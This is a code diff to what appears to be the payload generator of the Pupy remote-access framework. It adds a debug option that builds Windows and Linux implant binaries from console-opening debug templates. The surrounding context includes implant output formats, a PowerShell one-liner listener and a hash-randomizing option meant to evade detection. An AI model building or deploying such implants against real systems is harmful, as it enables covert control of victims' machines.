@@ -22,28 +22,44 @@ import os
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
 
 
-def get_edit_pupyx86_dll(conf):
+def get_edit_pupyx86_dll(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.dll"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.dll"), conf)
 
-def get_edit_pupyx64_dll(conf):
+def get_edit_pupyx64_dll(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.dll"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.dll"), conf)
 
-def get_edit_pupyx86_exe(conf):
+def get_edit_pupyx86_exe(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.exe"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.exe"), conf)
 
-def get_edit_pupyx64_exe(conf):
+def get_edit_pupyx64_exe(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.exe"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.exe"), conf)
 
-def get_edit_pupyx86_lin(conf):
+def get_edit_pupyx86_lin(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.lin"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.lin"), conf)
 
-def get_edit_pupyx64_lin(conf):
+def get_edit_pupyx64_lin(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.lin"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.lin"), conf)
 
-def get_edit_pupyx86_so(conf):
+def get_edit_pupyx86_so(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86d.so"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.so"), conf)
 
-def get_edit_pupyx64_so(conf):
+def get_edit_pupyx64_so(conf, debug=False):
+    if debug:
+        return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64d.so"), conf)
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.so"), conf)
 
 def get_edit_binary(path, conf):
@@ -302,6 +318,7 @@ if __name__=="__main__":
     parser.add_argument('--ps1-oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner listener (default: %(default)s)")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
     parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
+    parser.add_argument('--debug', action='store_true', help="build with the debug template (the payload open a console)")
     parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
     parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
     parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
@@ -341,53 +358,53 @@ if __name__=="__main__":
     conf['offline_script']=script_code
     outpath=args.output
     if args.format=="exe_x86":
-        binary=get_edit_pupyx86_exe(conf)
+        binary=get_edit_pupyx86_exe(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx86.exe"
         with open(outpath, 'wb') as w:
             w.write(binary)
     elif args.format=="lin_x86":
-        binary=get_edit_pupyx86_lin(conf)
+        binary=get_edit_pupyx86_lin(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx86.lin"
         with open(outpath, 'wb') as w:
             w.write(binary)
         os.chmod(outpath, 0711)
     elif args.format=="so_x86":
-        binary=get_edit_pupyx86_lin(conf)
+        binary=get_edit_pupyx86_lin(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx86.so"
         with open(outpath, 'wb') as w:
             w.write(binary)
         os.chmod(outpath, 0711)
     elif args.format=="lin_x64":
-        binary=get_edit_pupyx64_lin(conf)
+        binary=get_edit_pupyx64_lin(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx64.lin"
         with open(outpath, 'wb') as w:
             w.write(binary)
         os.chmod(outpath, 0711)
     elif args.format=="so_x64":
-        binary=get_edit_pupyx64_lin(conf)
+        binary=get_edit_pupyx64_lin(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx64.so"
         with open(outpath, 'wb') as w:
             w.write(binary)
         os.chmod(outpath, 0711)
     elif args.format=="exe_x64":
-        binary=get_edit_pupyx64_exe(conf)
+        binary=get_edit_pupyx64_exe(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx64.exe"
         with open(outpath, 'wb') as w:
             w.write(binary)
     elif args.format=="dll_x64":
-        binary=get_edit_pupyx64_dll(conf)
+        binary=get_edit_pupyx64_dll(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx64.dll"
         with open(outpath, 'wb') as w:
             w.write(binary)
     elif args.format=="dll_x86":
-        binary=get_edit_pupyx86_dll(conf)
+        binary=get_edit_pupyx86_dll(conf, debug=args.debug)
         if not outpath:
             outpath="pupyx86.dll"
         with open(outpath, 'wb') as w:
@@ -458,3 +475,4 @@ if __name__=="__main__":
     print("LAUNCHER = %s"%repr(args.launcher))
     print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
     print("SCRIPTLETS = %s"%args.scriptlet)
+    print("DEBUG = %s"%args.debug)
